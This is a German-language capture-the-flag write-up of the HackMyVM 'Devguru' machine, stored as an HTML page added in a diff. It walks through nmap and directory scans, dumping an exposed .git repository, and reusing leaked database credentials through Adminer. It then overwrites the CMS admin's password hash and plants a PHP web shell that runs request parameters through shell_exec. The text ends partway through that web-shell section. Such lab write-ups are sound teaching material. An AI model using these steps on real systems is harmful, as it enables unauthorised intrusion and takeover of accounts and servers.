@@ -1,0 +1,1006 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Devguru - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Devguru - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">GitTools (gitdumper.sh, extractor.sh)</div>
+                <div class="tool-item">Adminer (Web Interface)</div>
+                <div class="tool-item">bcrypt-generator.com</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">mysql (Client)</div>
+                <div class="tool-item">Go Playground (Web)</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">Gitea (Web Interface)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">sqlite3</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#git-exploit">Git Repository Exploit</a></li>
+                <li><a href="#database-access">Database Access & CMS Takeover</a></li>
+                <li><a href="#web-rce">Web RCE & Low Privilege Shell (www-data)</a></li>
+                <li><a href="#privesc-frank">Privilege Escalation (www-data to frank via Gitea)</a></li>
+                <li><a href="#poc-gitea-hooks">Proof of Concept 1 (Gitea Hooks - frank shell)</a></li>
+                <li><a href="#poc-sqlite">Proof of Concept 2 (Sudo sqlite3 - root shell)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Die erste Phase des Penetrationstests dient dazu, das Zielsystem im Netzwerk zu finden und Informationen über dessen Dienste und Konfigurationen zu sammeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.107</span>	08:00:27:43:81:45	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Mit `arp-scan -l` wird das lokale Netzwerk nach aktiven Hosts durchsucht. Wir identifizieren erfolgreich die IP-Adresse <span class="command">192.168.2.107</span> als potenzielles Ziel.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP bestätigt. Dies ist die Basis für weitere Scans.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die IP-Adresse für den Nmap-Scan verwenden. Hostnamen aus späteren Scans zur `/etc/hosts`-Datei hinzufügen, um die URL-basierte Erkundung zu erleichtern.
+            **Empfehlung (Admin):** Netzwerksegmentierung und Monitoring können helfen, solche Scans zu erkennen und einzudämmen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+#192.168.2.107   whythisapiissofast.kitty.hmv kitty.hmv fake.local jwt.hmv
+<span class="command">192.168.2.107    devguru.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir überprüfen unsere lokale `/etc/hosts`-Datei. Es ist bereits ein Eintrag vorhanden, der den Hostnamen `devguru.hmv` der gefundenen IP-Adresse <span class="command">192.168.2.107</span> zuordnet. Dies wurde wahrscheinlich aufgrund vorheriger Informationen oder Annahmen hinzugefügt.</p>
+            <p class="evaluation">**Bewertung:** Das Vorhandensein dieses Eintrags ermöglicht es uns, das Zielsystem direkt über den Hostnamen `devguru.hmv` anzusprechen, was für die Web-Enumeration wichtig ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Immer gefundene oder vermutete Hostnamen zur `/etc/hosts`-Datei hinzufügen, um virtuelle Hosts korrekt zu scannen und Webanwendungen im Browser aufrufen zu können.
+            **Empfehlung (Admin):** Sicherstellen, dass DNS-Einträge korrekt konfiguriert sind und interne Hostnamen nicht unnötig nach außen dringen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.107 -p-</span></div>
+                    <pre>
+Starting Nmap [...]
+Nmap scan report for devguru.local (192.168.2.107)
+Host is up [...]
+Not shown: [...] closed tcp ports [...]
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   [...] (RSA)
+|   [...] (ECDSA)
+|_  [...] (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+|_http-generator: DevGuru
+|_http-title: Corp - DevGuru
+<span class="password">| http-git:</span>
+<span class="password">|   192.168.2.107:80/.git/</span>
+<span class="password">|     Git repository found!</span>
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: first commit
+<span class="password">|     Remotes:</span>
+<span class="password">|       http://devguru.local:8585/frank/devguru-website.git</span>
+|_    Project type: PHP application (guessed from .gitignore)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+<span class="command">8585/tcp open  unknown</span>
+| fingerprint-strings:
+|   [...]
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     [...]
+|     <span class="password">Set-Cookie: i_like_gitea=b5ca1e0f8efb7cf3; Path=/; HttpOnly</span>
+|     [...]
+|     <span class="password"><title> Gitea: Git with a cup of tea </title></span>
+|     [...]
+|   HTTPOptions:
+|     HTTP/1.0 404 Not Found
+|     [...]
+|     <span class="password"><title>Page Not Found - Gitea: Git with a cup of tea </title></span>
+|     [...]
+<span class="password">1 service unrecognized despite returning data.</span> [...]
+MAC Address: 08:00:27:43:81:45 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms devguru.local (192.168.2.107)
+[...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der detaillierte Nmap-Scan auf `192.168.2.107` liefert mehrere wichtige Informationen:
+            *   <span class="command">Port 22 (SSH)</span>: Läuft mit OpenSSH 7.6p1 (etwas älter, aber nicht unmittelbar kritisch).
+            *   <span class="command">Port 80 (HTTP)</span>: Apache 2.4.29 auf Ubuntu. Interessanterweise findet das Nmap-Skript `http-git` ein <span class="password">öffentlich zugängliches `.git`-Verzeichnis</span> direkt im Web-Root. Es extrahiert sogar Informationen wie die letzte Commit-Nachricht und einen Remote-Pfad: `<span class="password">http://devguru.local:8585/frank/devguru-website.git</span>`. Dies ist ein kritischer Fund, da er auf Quellcode-Leakage hindeutet und einen Link zum Dienst auf Port 8585 herstellt. Die Seite scheint mit "DevGuru" generiert worden zu sein.
+            *   <span class="command">Port 8585 (Unknown)</span>: Nmap kann den Dienst nicht direkt identifizieren, aber die Fingerprints (insbesondere HTTP-Header und Titel-Tags) deuten klar auf eine <span class="password">Gitea-Instanz</span> hin (eine selbstgehostete Git-Service-Plattform). Das Cookie `i_like_gitea` bestätigt dies.</p>
+            <p class="evaluation">**Bewertung:** Der Nmap-Scan hat zwei extrem wertvolle Informationen geliefert: 1. Ein exponiertes `.git`-Verzeichnis auf Port 80, was uns potenziell den gesamten Quellcode der Webanwendung offenlegt. 2. Eine Gitea-Instanz auf Port 8585, die als Git-Remote für die Webanwendung dient. Diese beiden Punkte sind unsere Hauptangriffsvektoren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das exponierte `.git`-Verzeichnis mit Tools wie `gitdumper` herunterladen, um den Quellcode zu extrahieren. Die Gitea-Instanz auf Port 8585 untersuchen (Webinterface besuchen, nach Standard-Logins oder Registrierungsmöglichkeiten suchen). Den extrahierten Quellcode auf Hardcoded Credentials, Schwachstellen oder weitere Hinweise analysieren.
+            **Empfehlung (Admin):** **Sofort den Zugriff auf das `.git`-Verzeichnis über den Webserver blockieren!** Dies ist eine schwere Sicherheitslücke. Die Gitea-Instanz absichern (Zugriff beschränken, Updates prüfen). Sicherstellen, dass keine sensiblen Daten in Git-Repositories committet werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.107 -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '403,404' -e</span></div>
+                    <pre>
+[...]
+<span class="command">http://192.168.2.107/index.php</span>            (Status: 200) [Size: 12719]
+<span class="command">http://192.168.2.107/about</span>                (Status: 200) [Size: 18661]
+<span class="command">http://192.168.2.107/services</span>             (Status: 200) [Size: 10032]
+<span class="command">http://192.168.2.107/themes</span>               (Status: 301) [Size: 315] [--> http://192.168.2.107/themes/]
+<span class="command">http://192.168.2.107/modules</span>              (Status: 301) [Size: 316] [--> http://192.168.2.107/modules/]
+<span class="command">http://192.168.2.107/storage</span>              (Status: 301) [Size: 316] [--> http://192.168.2.107/storage/]
+<span class="command">http://192.168.2.107/plugins</span>              (Status: 301) [Size: 316] [--> http://192.168.2.107/plugins/]
+<span class="command">http://192.168.2.107/server.php</span>           (Status: 200) [Size: 0]
+<span class="command">http://192.168.2.107/backend</span>              (Status: 302) [Size: 410] [--> http://192.168.2.107/backend/backend/auth]
+<span class="command">http://192.168.2.107/vendor</span>               (Status: 301) [Size: 315] [--> http://192.168.2.107/vendor/]
+<span class="command">http://192.168.2.107/config</span>               (Status: 301) [Size: 315] [--> http://192.168.2.107/config/]
+<span class="command">http://192.168.2.107/adminer.php</span>          (Status: 200) [Size: 4228]
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen einen `gobuster`-Verzeichnisscan auf Port 80 durch, um nach versteckten oder interessanten Dateien und Verzeichnissen zu suchen. Neben Standard-Verzeichnissen eines Web-Frameworks (wie `themes`, `modules`, `storage`, `plugins`, `vendor`, `config`, was auf ein CMS wie OctoberCMS oder Laravel hindeuten könnte) finden wir zwei besonders interessante Endpunkte:
+            *   `<span class="command">/backend</span>`: Leitet auf eine Authentifizierungsseite (`/backend/backend/auth`) weiter. Dies ist wahrscheinlich der Admin-Login des CMS.
+            *   `<span class="command">/adminer.php</span>`: Dies ist ein bekannter, dateibasierter Datenbank-Administrationsclient. Das Vorhandensein dieser Datei ist oft eine erhebliche Sicherheitslücke, wenn sie nicht ordnungsgemäß geschützt ist.</p>
+            <p class="evaluation">**Bewertung:** Der Gobuster-Scan bestätigt die Vermutung eines Frameworks/CMS und liefert zwei kritische Funde: den Admin-Login (`/backend`) und den Datenbank-Client (`/adminer.php`). `adminer.php` ist besonders vielversprechend, wenn wir Datenbank-Zugangsdaten finden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Priorität hat nun das Herunterladen und Analysieren des `.git`-Verzeichnisses, um Zugangsdaten (insbesondere für die Datenbank) zu finden. Danach versuchen, auf `/adminer.php` mit den gefundenen Zugangsdaten zuzugreifen. Den `/backend`-Login im Auge behalten.
+            **Empfehlung (Admin):** `adminer.php` und ähnliche Datenbank-Verwaltungstools niemals auf produktiven Webservern belassen. Wenn sie zur Entwicklung benötigt werden, Zugriff stark einschränken (IP-Filter, Authentifizierung). Admin-Bereiche (`/backend`) ordnungsgemäß absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://devguru.local</span></div>
+                    <pre>
+[...]
+---- Scanning URL: http://devguru.local/ ----
++ <span class="command">http://devguru.local/.git/HEAD</span> (CODE:200|SIZE:23)
++ <span class="command">http://devguru.local/.htaccess</span> (CODE:200|SIZE:1678)
+[...]
+                    </pre>
+                     <!-- Abbruch mit Ctrl+C -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein zusätzlicher Scan mit `dirb` (einem anderen Verzeichnis-Scanner) wird gestartet. Er findet ebenfalls das `.git`-Verzeichnis und eine `.htaccess`-Datei, bevor er abgebrochen wird. Die `.htaccess`-Datei könnte interessante Apache-Konfigurationen oder Regeln enthalten.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den Fund des `.git`-Verzeichnisses. Die `.htaccess`-Datei könnte ebenfalls nützlich sein, aber der Fokus liegt auf dem `.git`-Verzeichnis.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt der `.htaccess`-Datei herunterladen und prüfen. Hauptfokus bleibt das `.git`-Verzeichnis.
+            **Empfehlung (Admin):** Sicherstellen, dass `.htaccess`-Dateien keine sensiblen Informationen oder unsicheren Konfigurationen enthalten.</p>
+
+        </section>
+
+        <section id="git-exploit">
+            <h2>Git Repository Exploit</h2>
+            <p class="comment">Wir haben ein exponiertes `.git`-Verzeichnis auf dem Webserver gefunden. Wir nutzen nun spezielle Tools, um dieses Repository herunterzuladen und den ursprünglichen Quellcode wiederherzustellen, in der Hoffnung, sensible Informationen zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">/root/Hackingtools/GitTools/Dumper/gitdumper.sh http://devguru.local/.git/ .</span></div>
+                    <pre>
+[*] Dumping <span class="command">http://devguru.local/.git/</span>
+[+] Downloaded: HEAD
+[...]
+[+] Downloaded: objects/53/648852097d71662c523146814687b1ca05aeb9
+[+] Downloaded: objects/0f/df1864337b3e1d4a3f90156eda5c61cb1fdf80
+[...]
+<span class="password">[+] Downloaded 7/7 objects</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden das Skript `gitdumper.sh` aus den "GitTools". Dieses Skript ist darauf spezialisiert, ein über HTTP zugängliches `.git`-Verzeichnis rekursiv herunterzuladen, indem es die Struktur des Git-Objektmodells nachbildet. Wir geben die URL des `.git`-Verzeichnisses und ein lokales Zielverzeichnis (`.`) an. Das Skript lädt erfolgreich alle benötigten Git-Objekte herunter.</p>
+            <p class="evaluation">**Bewertung:** Das Herunterladen des Repositories war erfolgreich. Wir haben nun eine lokale Kopie des `.git`-Verzeichnisses der Webanwendung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das heruntergeladene Repository mit dem `extractor.sh`-Skript (ebenfalls aus GitTools) oder `git checkout` untersuchen, um den Quellcode wiederherzustellen.
+            **Empfehlung (Admin):** Zugriff auf `.git`-Verzeichnisse über Webserver dringend verhindern (z.B. durch Apache/Nginx-Konfiguration).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv]
+└─# <span class="command">/root/Hackingtools/GitTools/Extractor/extractor.sh . extract</span></div>
+                    <pre>
+[*] Extracting objects
+[+] Found commit: <span class="command">7de9115700c5656c670b34987c6fbffd39d90cf2</span>
+[+] Found file: themes/demo/assets/css/style.css
+[+] Found file: themes/demo/assets/images/about.jpg
+[...]
+[+] Found file: <span class="command">config/database.php</span>
+[...]
+[+] Found folder: /root/devguru-hmv/extract/0-7de9115700c5656c670b34987c6fbffd39d90cf2/themes/demo/partials/site
+[+] Found file: /root/devguru-hmv/extract/0-7de9115700c5656c670b34987c6fbffd39d90cf2/themes/demo/partials/site/footer.htm
+[+] Found file: /root/devguru-hmv/extract/0-7de9115700c5656c670b34987c6fbffd39d90cf2/themes/demo/partials/site/header.htm
+[+] Found file: /root/devguru-hmv/extract/0-7de9115700c5656c670b34987c6fbffd39d90cf2/themes/demo/theme.yaml
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden das Skript `extractor.sh` auf das heruntergeladene `.git`-Verzeichnis (`.`). Das Skript analysiert die Git-Objekte und stellt die Dateistruktur des letzten Commits (`7de9...`) in einem Unterverzeichnis (`extract/0-7de9...`) wieder her. Es listet alle wiederhergestellten Dateien auf. Besonders interessant ist die gefundene Datei `<span class="command">config/database.php</span>`.</p>
+            <p class="evaluation">**Bewertung:** Die Wiederherstellung des Quellcodes war erfolgreich. Wir haben nun Zugriff auf die Dateien der Webanwendung, insbesondere auf potenziell sensible Konfigurationsdateien.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die wiederhergestellten Dateien, insbesondere `config/database.php` und andere Konfigurationsdateien (z.B. `config/app.php`), auf Zugangsdaten, API-Schlüssel oder andere sensible Informationen untersuchen.
+            **Empfehlung (Admin):** Niemals sensible Daten wie Passwörter oder API-Keys direkt in Git-Repositories speichern. Konfigurationsmanagement-Tools oder Umgebungsvariablen verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/devguru-hmv/extract/0-7de9115700c5656c670b34987c6fbffd39d90cf2]
+└─# <span class="command">cat config/database.php</span></div>
+                    <pre>
+ 
+return [
+
+    /*
+    |--------------------------------------------------------------------------
+    | Default Database Connection Name
+    |--------------------------------------------------------------------------
+    |
+    | Here you may specify which of the database connections below you wish
+    | to use as your default connection for all database work. Of course
+    | you may use many connections at once using the Database library.
+    |
+    */
+
+    'default' => env('DB_CONNECTION', 'mysql'),
+
+    /*
+    |--------------------------------------------------------------------------
+    | Database Connections
+    |--------------------------------------------------------------------------
+    |
+    | Here are each of the database connections setup for your application.
+    | Of course, examples of configuring each database platform that is
+    | supported by Winter CMS is provided below to make development simple.
+    |
+    |
+    | All database work in Winter CMS is done through the PHP PDO facilities
+    | so make sure you have the driver for your particular database of
+    | choice installed on your machine before you begin development.
+    |
+    */
+
+    'connections' => [
+
+        'sqlite' => [
+            'driver'   => 'sqlite',
+            'database' => storage_path('database.sqlite'), // Absolute path
+            'prefix'   => '',
+        ],
+
+        'mysql' => [
+            'driver'     => 'mysql',
+            'engine'     => 'InnoDB',
+            'host'       => env('DB_HOST', 'localhost'),
+            'port'       => env('DB_PORT', 3306),
+            'database'   => env('DB_DATABASE', 'octoberdb'),
+            'username'   => env('DB_USERNAME', '<span class="command">october</span>'),
+            'password'   => env('DB_PASSWORD', '<span class="password">SQ66EBYx4GT3byXH</span>'),
+            'charset'    => 'utf8mb4',
+            'collation'  => 'utf8mb4_unicode_ci',
+            'prefix'     => '',
+            'varcharmax' => 191,
+        ],
+
+        'pgsql' => [
+            'driver'   => 'pgsql',
+            'host'     => env('DB_HOST', 'localhost'),
+            'port'     => env('DB_PORT', 5432),
+            'database' => env('DB_DATABASE', 'database'),
+            'username' => env('DB_USERNAME', 'root'),
+            'password' => env('DB_PASSWORD', ''),
+            'charset'  => 'utf8',
+            'prefix'   => '',
+            'schema'   => 'public',
+        ],
+
+        'sqlsrv' => [
+            'driver'   => 'sqlsrv',
+            'host'     => env('DB_HOST', 'localhost'),
+            'port'     => env('DB_PORT', 1433),
+            'database' => env('DB_DATABASE', 'database'),
+            'username' => env('DB_USERNAME', 'root'),
+            'password' => env('DB_PASSWORD', ''),
+            'prefix'   => '',
+        ],
+
+    ],
+
+    /*
+    |--------------------------------------------------------------------------
+    | Migration Repository Table
+    |--------------------------------------------------------------------------
+    |
+    | This table keeps track of all the migrations that have already run for
+    | your application. Using this information, we can determine which of
+    | the migrations on disk haven't actually been run in the database.
+    |
+    */
+
+    'migrations' => 'migrations',
+
+    /*
+    |--------------------------------------------------------------------------
+    | Redis Databases
+    |--------------------------------------------------------------------------
+    |
+    | Redis is an open source, fast, networked key-value data store server
+    | with optional durability persistence. It is often used as a backend
+    | for caching and messaging systems. Winter CMS makes it easy to dig right in.
+    |
+    */
+
+    'redis' => [
+
+        'cluster' => false,
+
+        'default' => [
+            'host'     => env('REDIS_HOST', 'localhost'),
+            'password' => env('REDIS_PASSWORD', null),
+            'port'     => env('REDIS_PORT', 6379),
+            'database' => env('REDIS_DATABASE', 0),
+        ],
+
+    ],
+
+    /*
+    |--------------------------------------------------------------------------
+    | Use DB configuration for testing
+    |--------------------------------------------------------------------------
+    |
+    | When running plugin tests, migrate existing layers down and run tests
+    | on a fresh empty DB specified by the default connection. Uses the same
+    | database specified for the default connection by default. (Can be
+    | overridden by specifying `database` in the `testing` connection below)
+    |
+    | Setting this value to `false` will use SQLite in memory unless a
+    | `testing` connection is defined below.
+    */
+    'useConfigForTesting' => false,
+];
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir untersuchen den Inhalt der wiederhergestellten `config/database.php`. Diese Datei enthält die Konfiguration für Datenbankverbindungen, typischerweise für ein PHP-Framework (hier wahrscheinlich OctoberCMS, ein Fork von Laravel, oder WinterCMS, ein Fork von OctoberCMS). Im `mysql`-Abschnitt finden wir hartcodierte Zugangsdaten:
+            *   Username: `<span class="command">october</span>`
+            *   Passwort: `<span class="password">SQ66EBYx4GT3byXH</span>`
+            *   Datenbank: `octoberdb`
+            *   Host: `localhost`</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein kritischer Fund! Wir haben gültige Zugangsdaten für die MySQL-Datenbank (`octoberdb`) gefunden, die von der Webanwendung genutzt wird. Diese können wir nun verwenden, um über `/adminer.php` auf die Datenbank zuzugreifen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundenen Zugangsdaten `<span class="command">october</span>` / `<span class="password">SQ66EBYx4GT3byXH</span>` verwenden, um sich über `http://devguru.local/adminer.php` mit der MySQL-Datenbank zu verbinden. Die Datenbank nach weiteren sensiblen Informationen durchsuchen, insbesondere nach Benutzer-Hashes für das CMS-Backend.
+            **Empfehlung (Admin):** Zugangsdaten niemals hartcodiert im Quellcode speichern. Umgebungsvariablen (`.env`-Dateien, die *nicht* im Git sind) oder sicherere Konfigurationsmanagement-Systeme verwenden.</p>
+
+        </section>
+
+        <section id="database-access">
+            <h2>Database Access & CMS Takeover</h2>
+            <p class="comment">Mit den im Quellcode gefundenen Datenbank-Zugangsdaten versuchen wir nun, über das `adminer.php`-Interface auf die Datenbank zuzugreifen und die Kontrolle über das CMS zu erlangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser (Adminer Login)</span></div>
+                    <pre>
+# Aufruf: http://devguru.local/adminer.php
+# Eingabe im Adminer Login-Formular:
+System: MySQL
+Server: localhost
+Benutzername: <span class="command">october</span>
+Passwort: <span class="password">SQ66EBYx4GT3byXH</span>
+Datenbank: octoberdb
+# Ergebnis nach Klick auf "Anmelden": Erfolgreicher Zugriff auf die Datenbankoberfläche.
+                    </pre>
+                    <div class="prompt"># <span class="command">Informationen aus Adminer (Datenbank)</span></div>
+                    <pre>
+Version MySQL: <span class="command">5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1</span> mit PHP-Erweiterung MySQLi
+Angemeldet als: <span class="command">october@localhost</span>
+
+# Inhalt der Tabelle 'backend_users' (oder ähnlich):
+Ändern	id	first_name	last_name	login	email	             password	                     	is_superuser
+bearbeiten	1	Frank	Morris	<span class="command">frank</span>	frank@devguru.local	<span class="password">$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK</span>	<span class="command">1</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden die Zugangsdaten (`october`/`SQ66EBYx4GT3byXH`) erfolgreich, um uns über `/adminer.php` mit der `octoberdb`-Datenbank auf `localhost` zu verbinden. In der Datenbank finden wir eine Tabelle, die Benutzerinformationen für das Backend enthält (vermutlich `backend_users`). Wir identifizieren einen Benutzer:
+            *   Login: `<span class="command">frank</span>`
+            *   Passwort-Hash: `<span class="password">$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK</span>` (Das `$2y$`-Präfix deutet auf einen Bcrypt-Hash hin).
+            *   `is_superuser`: 1 (Dieser Benutzer ist ein Administrator).</p>
+            <p class="evaluation">**Bewertung:** Wir haben Zugriff auf die Datenbank und den Passwort-Hash des CMS-Administrators `frank` gefunden. Da Bcrypt-Hashes schwer zu knacken sind, ist der nächste logische Schritt, den Hash in der Datenbank durch einen eigenen, bekannten Hash zu ersetzen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ein eigenes, sicheres Passwort wählen (z.B. `Benni1908`). Dieses Passwort mit einem Online-Bcrypt-Generator (oder einem lokalen Tool) hashen (wichtig: gleicher Algorithmus/Kostenfaktor wie der vorhandene Hash, falls möglich). Den generierten Hash verwenden, um den alten Hash des Benutzers `frank` in der Datenbank über Adminer zu überschreiben. Anschließend versuchen, sich im CMS-Backend (`http://devguru.local/backend`) als `frank` mit dem neuen Passwort (`Benni1908`) anzumelden.
+            **Empfehlung (Admin):** Datenbankzugriff vom Webserver aus einschränken (Netzwerk, Benutzerrechte). `adminer.php` entfernen. CMS-Passwörter sollten eine hohe Komplexität aufweisen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion auf bcrypt-generator.com (oder ähnliches Tool)</span></div>
+                    <pre>
+# Eingabe:
+Password: <span class="password">Benni1908</span>
+# Ausgabe (Beispiel für Bcrypt Hash mit Kostenfaktor 12):
+<span class="password">$2a$12$T3T/.0I2FwmpQmyDIwiKGumC0rkzBQcchFwFpl3gEzqe1QFRKu7fm</span>
+                    </pre>
+                    <div class="prompt"># <span class="command">Aktion in Adminer (Passwort-Update)</span></div>
+                    <pre>
+# Tabelle 'backend_users' auswählen.
+# Zeile für Benutzer 'frank' bearbeiten.
+# Im Feld 'password' den alten Hash durch den neu generierten ersetzen:
+Passwort: <span class="password">$2a$12$T3T/.0I2FwmpQmyDIwiKGumC0rkzBQcchFwFpl3gEzqe1QFRKu7fm</span>
+# Speichern.
+<span class="password">Datensatz wurde aktualisiert.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir wählen das Passwort `<span class="password">Benni1908</span>` und generieren den entsprechenden Bcrypt-Hash (`$2a$12$...`). Anschließend nutzen wir Adminer, um den alten Passwort-Hash des Benutzers `frank` in der Datenbank durch unseren neu generierten Hash zu ersetzen.</p>
+            <p class="evaluation">**Bewertung:** Das Passwort für den CMS-Admin `frank` wurde erfolgreich auf `<span class="password">Benni1908</span>` zurückgesetzt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nun zum CMS-Backend (`/backend`) navigieren und versuchen, sich als `frank` mit dem Passwort `Benni1908` anzumelden.
+            **Empfehlung (Admin):** Regelmäßige Passwort-Audits durchführen. Zugriff auf Datenbank-Tools wie Adminer im Produktivbetrieb verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser (Backend Login)</span></div>
+                    <pre>
+# Aufruf: http://devguru.local/backend
+# Eingabe im Login-Formular:
+Username: <span class="command">frank</span>
+Password: <span class="password">Benni1908</span>
+# Ergebnis nach Klick auf "Login": <span class="password">Erfolgreicher Login</span> in das CMS-Backend.
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir melden uns erfolgreich im Backend des CMS (vermutlich OctoberCMS/WinterCMS) als Administrator `frank` mit dem von uns gesetzten Passwort an.</p>
+            <p class="evaluation">**Bewertung:** Wir haben die Kontrolle über das CMS als Administrator erlangt. Dies ist ein bedeutender Fortschritt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das CMS-Backend nach Funktionen durchsuchen, die eine Codeausführung ermöglichen (z.B. Template-Bearbeitung, Plugin-Upload, Dateimanager).
+            **Empfehlung (Admin):** CMS und alle Plugins aktuell halten. Admin-Zugänge mit starken Passwörtern und idealerweise 2FA schützen.</p>
+        </section>
+
+        <section id="web-rce">
+             <h2>Web RCE & Low Privilege Shell (www-data)</h2>
+             <p class="comment">Nachdem wir administrativen Zugriff auf das CMS erlangt haben, suchen wir nach einer Möglichkeit, Code auf dem Server auszuführen, um eine Shell zu bekommen. Viele CMS erlauben Admins das Bearbeiten von Template-Dateien.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Aktion im CMS Backend (Template-Bearbeitung)</span></div>
+                     <pre>
+# Navigation zu einem Bereich für Template- oder Seitencode-Bearbeitung (z.B. CMS -> Pages -> home)
+# Umschalten zur "Code"-Ansicht der Seite.
+# Einfügen von PHP-Code in den `onStart()`-Funktionsblock (oder einen ähnlichen Block, der bei Seitenaufruf ausgeführt wird):
+<span class="password">function onStart()
+{
+    $this->page["evilVar"] = shell_exec($GET['cmd']);
+}</span>
+# Einfügen einer Ausgabe-Anweisung im Markup/HTML-Teil der Seite, um das Ergebnis des Befehls anzuzeigen:
+<span class="password">{{ this.page.evilVar }}</span>
